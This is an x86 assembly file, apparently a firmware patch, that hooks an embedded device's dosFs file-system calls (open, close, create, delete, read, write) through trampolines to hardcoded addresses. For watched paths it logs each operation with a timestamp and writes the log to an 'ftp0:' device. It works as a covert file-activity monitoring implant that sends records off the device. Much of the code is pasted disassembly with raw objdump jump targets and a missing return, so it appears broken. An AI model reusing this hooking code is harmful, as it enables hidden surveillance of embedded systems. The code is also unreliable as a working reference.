section .text

hook_dosFsOpen:

push ebp
mov ebp,esp
sub esp,1ch
call __hook_dosFsOpen
push 3739f6h
ret


hook_dosFsClose:

push ebp
mov ebp,esp
sub esp,1ch
call __hook_dosFsClose
push 373e56h
ret


hook_dosFsCreate:

push ebp
mov ebp,esp
sub esp,10h
call __hook_dosFsCreate
push 373db6h
ret


hook_dosFsDelete:

push ebp
mov ebp,esp
sub esp,0ch
call __hook_dosFsDelete
push 3741b6h
ret


hook_dosFsRead:

push ebp
mov ebp,esp
sub esp,14h
call __hook_dosFsRead
push 374b46h
ret


hook_dosFsWrite:

push ebp
mov ebp,esp
sub esp,14h
call __hook_dosFsWrite
push 374bb6h
ret


init_notify:
  push   ebp
  mov    ebp,esp
  sub    esp,0x8
  sub    esp,0xc
  push   0x404
  
  ;call   f <init_notify+0xf> ==== malloc() 
  mov eax, 38b380h
  call  eax

  add    esp,0x10
  test   eax,eax
  mov    ds:0x0,eax
  jne    30 ;                    <init_notify+0x30>
  or     eax,0xffffffff
  jmp    41                      ;  <init_notify+0x41>
  lea    esi,[esi+0x0]
  lea    edi,[edi+0x0]
  mov    DWORD [eax+0x400],0x0
  

  ;call   3b <init_notify+0x3b>
  call init_ftp;

  xor    eax,eax
  mov    esp,ebp
  pop    ebp
  ret    
  lea    esi,[esi+eiz*1+0x0]
  lea    edi,[edi+eiz*1+0x0]


add_notify:

 	push   ebp
 	mov    ebp,esp
 	sub    esp,0x14
 	push   ebx
 	sub    esp,0xc
 	push   0x404
 	
       ;call   60 <add_notify+0x10>  ====== malloc 
        mov eax,38b380h
        call eax
 	
        mov    ebx,eax
 	add    esp,0x10
 	mov    BYTE [ebp-0x8],0x68
 	mov    BYTE [ebp-0x7],0x6f
 	mov    BYTE [ebp-0x6],0x6f
 	mov    BYTE [ebp-0x5],0x6b
 	mov    BYTE [ebp-0x4],0x5f
 	mov    BYTE [ebp-0x3],0x0
 	test   ebx,ebx
 	jne    90; <add_notify+0x40>
 	or     eax,0xffffffff
 	jmp    fa ;<add_notify+0xaa>
 	lea    esi,[esi+0x0]
 	mov    eax,ds:0x0
 	test   eax,eax
 	jne    b0 ;<add_notify+0x60>
 	sub    esp,0xc
 	push   ebx
 	
       ; call   9e <add_notify+0x4e>=====free
       mov eax,0x38b3a0
       call eax
  	
       or     eax,0xffffffff
 jmp    fa; <add_notify+0xaa>
 	mov    esi,esi
 	lea    edi,[edi+eiz*1+0x0]
 	sub    esp,0x4
 	push   0x404
 	push   0x0
 	push   ebx
 	
        ;call   bc <add_notify+0x6c> ==memset
	mov eax,381170h
	call eax

 	add    esp,0x10
 	lea    eax,[ebp-0x8]
 	sub    esp,0x8
 	push   eax
 	push   ebx
 	

        ;strcpy      call   cc <add_notify+0x7c>
	mov eax,3813a0h
	call eax

 	add    esp,0x10
 	mov    eax,DWORD  [ebp+0x8]
 	sub    esp,0x8
 	push   eax
 	push   ebx

 	;strcat call   dc <add_notify+0x8c>
	mov eax,3811a0h
	call eax

 	mov    edx,DWORD  ds:0x0
 	mov    eax,DWORD  [edx+0x400]
 	mov    DWORD  [ebx+0x400],eax
 	mov    DWORD  [edx+0x400],ebx
 	xor    eax,eax
 	mov    ebx,DWORD  [ebp-0x18]
 	mov    esp,ebp
 	pop    ebp
 	ret    

del_notify:
	push   ebp
	mov    eax,ds:0x0
	mov    ebp,esp
	sub    esp,0xc
	test   eax,eax
	push   edi
	mov    edi,DWORD  [ebp+0x8]
	push   esi
	push   ebx
	jne    130 <del_notify+0x20>
	or     eax,0xffffffff
	jmp    187; <del_notify+0x77>
	lea    esi,[esi+0x0]
	mov    esi,eax
	mov    ebx,DWORD  [esi+0x400]
	test   ebx,ebx
	je     15d; <del_notify+0x4d>
	lea    esi,[esi+eiz*1+0x0]
	sub    esp,0x8
	push   edi
	push   ebx
	

; strcmp    call   146 <del_notify+0x36>
   mov eax, 381210h
call eax

	add    esp,0x10
	test   eax,eax
	je     170 ;<del_notify+0x60>
	mov    esi,ebx
	mov    ebx,DWORD  [ebx+0x400]
	test   ebx,ebx
	jne    140; <del_notify+0x30>
	test   ebx,ebx
	jne    187; <del_notify+0x77>
	or     eax,0xffffffff
	jmp    187 ;<del_notify+0x77>
	lea    esi,[esi+0x0]
	lea    edi,[edi+eiz*1+0x0]
	mov    eax,DWORD  [ebx+0x400]
	sub    esp,0xc
	mov    DWORD  [esi+0x400],eax
	push   ebx

	;  free  call   181 <del_notify+0x71>

	mov eax, 38b3a0h
	call eax

	xor    eax,eax
	lea    esp,[ebp-0x18]
	pop    ebx
	pop    esi
	pop    edi
	mov    esp,ebp
	pop    ebp
	ret    
	jmp    1a0h  ; <exit_notify>

exit_notify:
 	push   ebp
 	mov    ebp,esp
 	sub    esp,0x8


 	;call   1a7 <exit_notify+0x7>
        call exit_ftp
 	mov    edx,DWORD  ds:0x0
 	test   edx,edx
 	je     1e2 ;<exit_notify+0x42>
 	lea    esi,[esi+eiz*1+0x0]
 	lea    edi,[edi+eiz*1+0x0]
 	sub    esp,0xc
 	mov    eax,DWORD  [edx+0x400]
 	mov    ds:0x0,eax
 	push   edx
 	

	; free  call   1d0 <exit_notify+0x30>
        mov eax, 38b3a0h
	call eax

 	mov    eax,ds:0x0
 	add    esp,0x10
 	mov    edx,eax
 	test   edx,edx
 	jne    1c0 ;<exit_notify+0x20>
 	mov    esp,ebp
 	pop    ebp

init_ftp:
 	push   ebp
 	mov    ebp,esp
 	sub    esp,0x14
 	mov    BYTE  [ebp-0xc],0x66
 	push   ebx
 	lea    ebx,[ebp-0xc]
 	sub    esp,0x8
 	mov    BYTE  [ebx+0x1],0x74
 	mov    eax,DWORD  [ebp-0xc]
 	push   0x1e6
 	or     eax,0x700000
 	push   ebx
 	and    eax,0x70ffff
 	mov    DWORD [ebp-0xc],eax
 	mov    BYTE [ebp-0x8],0x66
 	mov    BYTE [ebp-0x7],0x74
 	mov    BYTE  [ebp-0x6],0x70
 	mov    BYTE  [ebp-0x5],0x30
 	mov    BYTE  [ebp-0x4],0x3a
 	mov    BYTE  [ebp-0x3],0x0
 	

        ;        call   284 <init_ftp+0x44>
	mov eax, 349460h
	call eax

 	lea    eax,[ebp-0x8]
 	add    esp,0x10
 	sub    esp,0x4
 	push   0x1
 	push   ebx
 	push   eax
 
	;      call   296 <init_ftp+0x56>
	mov  eax,34f700h
	call eax

 	add    esp,0x10
 	sub    esp,0x4
 	push   0x1a4
 	push   0x201
 	push   0x200

 	;   open   call   2b0 <init_ftp+0x70>
	mov eax, 388140h
	call eax

 	add    esp,0x10
 	mov    ds:0x0,eax
 	sub    esp,0x4
 	push   0x2
 	push   0x0
 	push   eax

 	;call   2c5 <init_ftp+0x85>
	mov eax, 388650h
	call eax

 	mov    ebx,DWORD  [ebp-0x18]
 	mov    esp,ebp
 	xor    eax,eax
 	pop    ebp
 	ret    
 	lea    esi,[esi+eiz*1+0x0]
 	lea    edi,[edi+eiz*1+0x0]

exit_ftp:
  	push   ebp
  	mov    eax,ds:0x0
  	mov    ebp,esp
  	sub    esp,0x8
  	sub    esp,0xc
  	push   eax
  	
	;  close  call   2f0 <exit_ftp+0x10>
	mov eax, 3884a0h
	call eax

  	mov    esp,ebp
  	xor    eax,eax
  	pop    ebp
  	ret    

ftp_write:
  	push   ebp
  	mov    ebp,esp
  	sub    esp,0x8
  	mov    eax,DWORD  [ebp+0xc]
  	sub    esp,0x4
  	push   eax
  	mov    eax,DWORD  [ebp+0x8]
  	push   eax
  	mov    eax,ds:0x0
  	push   eax
  	
	;  write   call   318 <ftp_write+0x18>
	mov eax, 3885d0h
	call eax  	

	mov    esp,ebp
  	pop    ebp
  	ret    

read_ebp:
	push   ebp
	mov    ebp,esp
	mov    eax,ebp
	mov    esp,ebp
	pop    ebp
	ret    

pathcmp:
    	push   ebp
    	mov    ebp,esp
    	sub    esp,0xc
    	push   edi
    	xor    edi,edi
    	push   esi
    	mov    esi,DWORD  [ebp+0xc]
    	push   ebx
    	mov    ebx,DWORD  [ebp+0x8]
    	sub    esp,0xc
    	push   ebx
    	
     ;    call   346 <pathcmp+0x16>
mov eax, 381550h
call eax


    	add    esp,0x10
    	cmp    BYTE  [eax+ebx*1-0x1],0x2f
    	je     382; <pathcmp+0x52>
    	sub    esp,0xc
    	push   ebx
   
 ;	call   359 <pathcmp+0x29>
mov eax, 381550h
call eax

    	add    esp,0x10
    	sub    esp,0xc
    	mov    BYTE  [eax+ebx*1],0x2f
    	push   ebx

  ;  	call   369 <pathcmp+0x39>
mov eax, 381550h
call eax

    	mov    BYTE  [eax+ebx*1+0x1],0x0
    	jmp    382; <pathcmp+0x52>
    	lea    esi,[esi+0x0]
    	lea    edi,[edi+0x0]
    	inc    ebx
    	inc    esi
    	cmp    BYTE  [ebx],0x0
    	je     395 ;<pathcmp+0x65>
    	xor    edx,edx
    	mov    dl,BYTE  [ebx]
    	xor    eax,eax
    	mov    al,BYTE  [esi]
    	mov    edi,edx
    	sub    edi,eax
    	je     380; <pathcmp+0x50>
    	test   edi,edi
    	jns    3a0 <pathcmp+0x70>
    	or     eax,0xffffffff
    	jmp    3b2 ;<pathcmp+0x82>
    	mov    esi,esi
    	cmp    edi,0x0
    	jle    3b0 <pathcmp+0x80>
    	mov    eax,0x1
    	jmp    3b2  ; <pathcmp+0x82>
    	lea    esi,[esi+eiz*1+0x0]
    	xor    eax,eax
    	lea    esp,[ebp-0x18]
    	pop    ebx
    	pop    esi
    	pop    edi
    	mov    esp,ebp
    	pop    ebp
    	ret    
    	lea    esi,[esi+eiz*1+0x0]

biostime:
     	push   ebp
     	mov    ebp,esp
     	sub    esp,0x38
     	sub    esp,0x8
     	push   0x0
     	push   0x70
     	
     ; sysOutByte   call   3ce <biostime+0xe>

mov eax,3080b0h
call eax

     	add    esp,0x10
     	sub    esp,0xc
     	push   0x71
     	
;call   3db <biostime+0x1b>

mov eax, 308080h
call eax

     	mov    edx,eax
     	shr    al,0x4
     	and    eax,0xff
     	add    esp,0x10
     	and    edx,0xf
     	sub    esp,0x8
     	lea    eax,[eax+eax*4]
     	push   0x2
     	push   0x70
     	lea    eax,[edx+eax*2]
     	mov    DWORD  [ebp-0x24],eax
     	
	;call   400 <biostime+0x40>
	mov eax,3080b0h
	call eax

     	add    esp,0x10
     	sub    esp,0xc
     	push   0x71
     	
;call   40d <biostime+0x4d>
mov eax, 308080h
call eax

     	mov    edx,eax
     	shr    al,0x4
     	and    eax,0xff
     	add    esp,0x10
     	and    edx,0xf
     	sub    esp,0x8
     	lea    eax,[eax+eax*4]
     	push   0x4
     	push   0x70
     	lea    eax,[edx+eax*2]
     	mov    DWORD  [ebp-0x20],eax
     	
;call   432 <biostime+0x72>
mov eax,3080b0h
call eax

     	add    esp,0x10
     	sub    esp,0xc
     	push   0x71
     	
;call   43f <biostime+0x7f>
mov eax, 308080h
call eax

     	mov    edx,eax
     	shr    al,0x4
     	and    eax,0xff
     	add    esp,0x10
     	and    edx,0xf
     	sub    esp,0x8
     	lea    eax,[eax+eax*4]
     	push   0x7
     	push   0x70
     	lea    eax,[edx+eax*2]
     	mov    DWORD  [ebp-0x1c],eax
     	
;call   464 <biostime+0xa4>
mov eax,3080b0h
call eax

     	add    esp,0x10
     	sub    esp,0xc
     	push   0x71
     	
;call   471 <biostime+0xb1>
mov eax, 308080h
call eax

     	mov    edx,eax
     	shr    al,0x4
     	and    eax,0xff
     	add    esp,0x10
     	and    edx,0xf
     	sub    esp,0x8
     	lea    eax,[eax+eax*4]
     	push   0x8
     	push   0x70
     	lea    eax,[edx+eax*2]
     	mov    DWORD  [ebp-0x18],eax
     	
;call   496 <biostime+0xd6>
mov eax,3080b0h
call eax

     	add    esp,0x10
     	sub    esp,0xc
     	push   0x71
     	
;call   4a3 <biostime+0xe3>
mov eax, 308080h
call eax

     	mov    edx,eax
     	shr    al,0x4
     	and    eax,0xff
     	add    esp,0x10
     	and    edx,0xf
     	sub    esp,0x8
     	lea    eax,[eax+eax*4]
     	push   0x9
     	push   0x70
     	lea    eax,[edx+eax*2-0x1]
     	mov    DWORD  [ebp-0x14],eax
     	
;call   4c9 <biostime+0x109>
mov eax,3080b0h
call eax

     	add    esp,0x10
     	sub    esp,0xc
     	push   0x71
     	
;call   4d6 <biostime+0x116>
mov eax, 308080h
call eax

     	mov    edx,eax
     	shr    al,0x4
     	and    eax,0xff
     	and    edx,0xf
     	add    esp,0x10
     	lea    eax,[eax+eax*4]
     	sub    esp,0xc
     	lea    eax,[edx+eax*2+0x64]
     	mov    DWORD  [ebp-0x10],eax
     	lea    eax,[ebp-0x24]
     	push   eax
     	
;call   4fc <biostime+0x13c>
mov eax,3820d0h
call eax

     	mov    esp,ebp
     	pop    ebp
     	ret    
     	lea    esi,[esi+0x0]
     	lea    edi,[edi+0x0]

get_time:
    	push   ebp
    	mov    ebp,esp
    	sub    esp,0x3c
    	push   edi
    	lea    edi,[ebp-0x24]
    	push   esi
    	push   ebx
    	mov    ebx,DWORD  [ebp+0x8]
    	

	;call   520 <get_time+0x10>
  	call biostime

    	sub    esp,0x8
    	mov    DWORD  [ebp-0x2c],eax
    	lea    eax,[ebp-0x2c]
    	mov    DWORD  [eax+0x4],0x0
    	push   eax
    	push   0x0

    	;clock_settime     call   538 <get_time+0x28>
	mov eax,383a10h
	call eax
	
    	add    esp,0x10
    	sub    esp,0xc
    	push   0x0
    	
	;call   545 <get_time+0x35>
	mov eax, 0x382f00
	call eax     	

	add    esp,0x10
    	sub    esp,0xc
    	mov    DWORD  [ebp-0x30],eax
    	lea    eax,[ebp-0x30]
    	push   eax
    	
	;call  localtime  557 <get_time+0x47>
    	mov eax,382000h
	call eax
	
	add    esp,0x10
    	mov    esi,eax
    	sub    esp,0x8
    	lea    eax,[ebp-0x24]
    	sub    esp,0xc
    	cld    
    	mov    ecx,0x9
    	rep movsd es:[edi], ds:[esi]
    	push   eax
    	
	;   asctime  call   573 <get_time+0x63>
    	mov eax,381c70h
	call eax
	
 	add    esp,0x10
    	push   eax
    	push   ebx
    	
	;call   57d <get_time+0x6d>
	mov eax, 3813a0h
	call eax    	
	
	lea    esp,[ebp-0x48]
    	pop    ebx
    	pop    esi
    	pop    edi
    	mov    esp,ebp
    	pop    ebp
    	ret    

traverse:
 	push   ebp
 	mov    ebp,esp
 	sub    esp,0x4ac
 	lea    eax,[ebp-0x496]
 	mov    BYTE  [ebp-0x496],0x9
 	push   edi
 	mov    DWORD  [ebp-0x49c],eax
 	push   esi
 	push   ebx
 	mov    ebx,DWORD  [ebp+0x8]
 	test   ebx,ebx
 	mov    BYTE  [eax+0x1],0x0
 	mov    BYTE  [ebp-0x4],0xd
 	mov    BYTE  [ebp-0x3],0xa
 	mov    BYTE  [ebp-0x2],0x0
 	je     6ce; <traverse+0x13e>
 	lea    edi,[ebp-0x44]
 	lea    esi,[ebp-0x494]
 	lea    esi,[esi+0x0]
 	lea    edi,[edi+eiz*1+0x0]
 	sub    esp,0x8
 	mov    eax,DWORD  [ebp+0xc]
 	push   ebx
 	push   eax
 	
        ;      strcmp     call   5e9 <traverse+0x59>
	mov eax, 381210h
	call eax

 	add    esp,0x10
 	test   eax,eax
 	je     60c; <traverse+0x7c>
 	sub    esp,0x8
 	mov    edx,DWORD  [ebp+0xc]
 	push   edx
 	push   ebx
 	
        
        ;call   5fd <traverse+0x6d>
	call pathcmp

 	add    esp,0x10
 	test   eax,eax
 	jne    6c0 <traverse+0x130>
 	sub    esp,0x4
 	push   0x40
 	push   0x0
 	push   edi
 	
	; memset   call   615 <traverse+0x85>
	mov eax, 381170h
	call eax	
	

 	add    esp,0x10
 	sub    esp,0xc
 	push   edi

 	; get_time  call   621 <traverse+0x91>
	call get_time

 	add    esp,0x10
 	sub    esp,0x4
 	push   0x450
 	push   0x0
 	push   esi

 	; memset  call   634 <traverse+0xa4>
	mov eax, 381170h
	call eax	
	
 	add    esp,0x10
 	mov    eax,DWORD  [ebp+0x10]
 	sub    esp,0x8
 	push   eax
 	push   esi

 	;  strcpy  call   644 <traverse+0xb4>
	mov eax, 3813a0h
	call eax

 	add    esp,0x10
 	mov    eax,DWORD  [ebp-0x49c]
 	sub    esp,0x8
 	push   eax
 	push   esi

 	;call   657 <traverse+0xc7>
	mov eax,3811a0h
	call eax

 	add    esp,0x10
 	mov    eax,DWORD  [ebp+0xc]
 	sub    esp,0x8
 	push   eax
 	push   esi

 	;call   667 <traverse+0xd7>
	mov eax,3811a0h
	call eax

 	add    esp,0x10
 	lea    eax,[ebp-0x496]
 	sub    esp,0x8
 	push   eax
 	push   esi

 	;call   67a <traverse+0xea>
	mov eax,3811a0h
	call eax

 	add    esp,0x10
 	sub    esp,0x8
 	push   edi
 	push   esi

 	;call   687 <traverse+0xf7>
	mov eax,3811a0h
	call eax

 	add    esp,0x10
 	lea    eax,[ebp-0x4]
 	sub    esp,0x8
 	push   eax
 	push   esi

 	;call   697 <traverse+0x107>
	mov eax,3811a0h
	call eax

 	add    esp,0x10
 	sub    esp,0x8
 	sub    esp,0xc
 	push   esi
 	
        ;  strlen  call   6a6 <traverse+0x116> 
 	mov eax, 381550h
	call eax
	
	add    esp,0x10
 	push   eax
 	push   esi

 	;call   6b0 <traverse+0x120>
	call ftp_write

 	jmp    6ce; <traverse+0x13e>
 	lea    esi,[esi+0x0]
 	lea    edi,[edi+eiz*1+0x0]
 	mov    ebx,DWORD  [ebx+0x400]
 	test   ebx,ebx
 	jne    5e0 <traverse+0x50>
 	lea    esp,[ebp-0x4b8]
 	pop    ebx
 	pop    esi
 	pop    edi
 	mov    esp,ebp
 	pop    ebp
 	ret    
 

__hook_dosFsOpen:
   	push   ebp
   	mov    eax,ds:0x0
   	mov    ebp,esp
   	sub    esp,0x410
   	test   eax,eax
   	push   esi
   	push   ebx
   	je     74d; <hook_dosFsOpen+0x5d>
   	mov    esi,DWORD  [eax+0x400]
   	test   esi,esi
   	je     74d; <hook_dosFsOpen+0x5d>
   	sub    esp,0x4
   	lea    ebx,[ebp-0x400]
   	push   0x400
   	push   0x0
   	push   ebx
   	
        ;call   720 <hook_dosFsOpen+0x30>
	mov eax, 381170h
	call eax

   	add    esp,0x10
   	
        ;call   728 <hook_dosFsOpen+0x38>
	call read_ebp

   	sub    esp,0x8
   	mov    eax,DWORD  [eax]
   	mov    edx,DWORD  [eax+0x10]
   	push   edx
   	push   ebx
   	
	;call   737 <hook_dosFsOpen+0x47>
	mov eax,3813a0h
	call eax   	

	add    esp,0x10
   	sub    esp,0x4
   	push   0x6db
   	push   ebx
   	push   esi
   	
	;call   749 <hook_dosFsOpen+0x59>
	call traverse
	   	
 	lea    esp,[ebp-0x418]
   	pop    ebx
   	pop    esi
   	mov    esp,ebp
   	pop    ebp
   	ret    

__hook_dosFsCreate:
 	push   ebp
 	mov    eax,ds:0x0
 	mov    ebp,esp
 	sub    esp,0x410
 	test   eax,eax
 	push   esi
 	push   ebx
 	je     7cd; <hook_dosFsCreate+0x5d>
 	mov    esi,DWORD  [eax+0x400]
 	test   esi,esi
 	je     7cd ;<hook_dosFsCreate+0x5d>
 	sub    esp,0x4
 	lea    ebx,[ebp-0x400]
 	push   0x400
 	push   0x0
 	push   ebx
 	
	;call   7a0 <hook_dosFsCreate+0x30>
	mov eax,381170h
	call eax
	 	
	add    esp,0x10
 	
	;call   7a8 <hook_dosFsCreate+0x38>
 	call read_ebp
	
	sub    esp,0x8
 	mov    eax,DWORD [eax]
 	mov    edx,DWORD [eax+0x10]
 	push   edx
 	push   ebx
 	
	;call   7b7 <hook_dosFsCreate+0x47>
	mov eax,3813a0h
	call eax 	

	add    esp,0x10
 	sub    esp,0x4
 	push   0x759
 	push   ebx
 	push   esi
 	
	;call   7c9 <hook_dosFsCreate+0x59>
 	call traverse
	
	lea    esp,[ebp-0x418]
 	pop    ebx
 	pop    esi
 	mov    esp,ebp
 	pop    ebp
 	ret    

__hook_dosFsRead:
  	push   ebp
  	mov    eax,ds:0x0
  	mov    ebp,esp
  	sub    esp,0x40c
  	test   eax,eax
  	push   edi
  	push   esi
  	push   ebx
  	je     867; <hook_dosFsRead+0x77>
  	mov    edi,DWORD  [eax+0x400]
  	test   edi,edi
  	je     867; <hook_dosFsRead+0x77>
  	sub    esp,0x4
  	lea    esi,[ebp-0x400]
  	push   0x400
  	push   0x0
  	push   esi
  	
	;call   821 <hook_dosFsRead+0x31>
	mov eax, 381170h
	call eax

  	add    esp,0x10

  	;call   829 <hook_dosFsRead+0x39>
	call read_ebp

  	;call   82e <hook_dosFsRead+0x3e>
	call read_ebp


  	sub    esp,0xc
  	mov    ebx,DWORD  [eax+0x8]
  	push   ebx

  	;call   83a <hook_dosFsRead+0x4a>
	mov eax, 36aba0h
	call eax
	
  	mov    eax,DWORD  [ebx]
  	add    esp,0x10
  	sub    esp,0x8
  	mov    eax,DWORD  [eax+0x78]
  	add    eax,0xf0
  	push   eax
  	push   esi

  	;call   851 <hook_dosFsRead+0x61>
	mov eax, 3813a0h
	call eax

  	add    esp,0x10
  	sub    esp,0x4
  	push   0x7d9
  	push   esi
  	push   edi

  	;call   863 <hook_dosFsRead+0x73>
	call traverse

  	lea    esp,[ebp-0x418]
  	pop    ebx
  	pop    esi
  	pop    edi
  	mov    esp,ebp
  	pop    ebp
  	ret    

__hook_dosFsWrite:
 	push   ebp
 	mov    eax,ds:0x0
 	mov    ebp,esp
 	sub    esp,0x40c
 	test   eax,eax
 	push   edi
 	push   esi
 	push   ebx
 	je     907; <hook_dosFsWrite+0x77>
 	mov    edi,DWORD  [eax+0x400]
 	test   edi,edi
 	je     907 ;<hook_dosFsWrite+0x77>
 	sub    esp,0x4
 	lea    esi,[ebp-0x400]
 	push   0x400
 	push   0x0
 	push   esi
 	
	;call   8c1 <hook_dosFsWrite+0x31>
	mov eax, 381170h
 	call eax

	add    esp,0x10
 	
	;call   8c9 <hook_dosFsWrite+0x39>
	call read_ebp
	
 	;call   8ce <hook_dosFsWrite+0x3e>
	call read_ebp

 	sub    esp,0xc
 	mov    ebx,DWORD  [eax+0x8]
 	push   ebx

 	;call   8da <hook_dosFsWrite+0x4a>
	mov eax,36aba0h
	call eax
 
 	mov    eax,DWORD  [ebx]
 	add    esp,0x10
 	sub    esp,0x8
 	mov    eax,DWORD  [eax+0x78]
 	add    eax,0xf0
 	push   eax
 	push   esi

	
 	;call   8f1 <hook_dosFsWrite+0x61>
	mov eax, 3813a0h
	call eax

 	add    esp,0x10
 	sub    esp,0x4
 	push   0x874
 	push   esi
 	push   edi

 	;call   903 <hook_dosFsWrite+0x73>
	call traverse

 	lea    esp,[ebp-0x418]
 	pop    ebx
 	pop    esi
 	pop    edi
 	mov    esp,ebp
 	pop    ebp
 	ret    

__hook_dosFsClose:
	push   ebp
	mov    eax,ds:0x0
	mov    ebp,esp
	sub    esp,0x40c
	test   eax,eax
	push   edi
	push   esi
	push   ebx
	je     9a4; <hook_dosFsClose+0x74>
	mov    edi,DWORD  [eax+0x400]
	test   edi,edi
	je     9a4 ;<hook_dosFsClose+0x74>
	sub    esp,0x4
	lea    esi,[ebp-0x400]
	push   0x400
	push   0x0
	push   esi
	
	;call   961 <hook_dosFsClose+0x31>
	mov eax, 381170h
	call eax

	add    esp,0x10

	;call   969 <hook_dosFsClose+0x39>
	call read_ebp
	
	sub    esp,0xc
	mov    eax,DWORD  [eax]
	mov    ebx,DWORD  [eax+0x8]
	push   ebx

	;call   977 <hook_dosFsClose+0x47>
	mov eax, 36aba0h
	call eax

	mov    eax,DWORD  [ebx]
	add    esp,0x10
	sub    esp,0x8
	mov    eax,DWORD  [eax+0x78]
	add    eax,0xf0
	push   eax
	push   esi

	;call   98e <hook_dosFsClose+0x5e>
	mov eax, 3813a0h
	call eax

	add    esp,0x10
	sub    esp,0x4
	push   0x914
	push   esi
	push   edi

	;call   9a0 <hook_dosFsClose+0x70>
	call traverse

	lea    esp,[ebp-0x418]
	pop    ebx
	pop    esi
	pop    edi
	mov    esp,ebp
	pop    ebp
	ret    

__hook_dosFsDelete:
    	push   ebp
    	mov    eax,ds:0x0
    	mov    ebp,esp
    	sub    esp,0x410
    	test   eax,eax
    	push   esi
    	push   ebx
    	je     a30; <hook_dosFsDelete+0x60>
    	mov    esi,DWORD  [eax+0x400]
    	test   esi,esi
    	je     a30 ;<hook_dosFsDelete+0x60>
    	sub    esp,0x4
    	lea    ebx,[ebp-0x400]
    	push   0x400
    	push   0x0
    	push   ebx
    	
	;call   a00 <hook_dosFsDelete+0x30>
	mov eax, 381170h
	call eax

    	add    esp,0x10

    	;call   a08 <hook_dosFsDelete+0x38>
	call read_ebp 
    	;call   a0d <hook_dosFsDelete+0x3d>
	call read_ebp

    	sub    esp,0x8
    	mov    edx,DWORD  [eax+0x8]
    	push   edx
    	push   ebx

    	;call   a1a <hook_dosFsDelete+0x4a>
	mov eax, 3813a0h
	call eax
	
    	add    esp,0x10
    	sub    esp,0x4
    	push   0x9b1
    	push   ebx
    	push   esi

    	;call   a2c <hook_dosFsDelete+0x5c>
	call traverse	

    	lea    esp,[ebp-0x418]
    	pop    ebx
    	pop    esi
    	mov    esp,ebp
    	pop    ebp
    	ret    
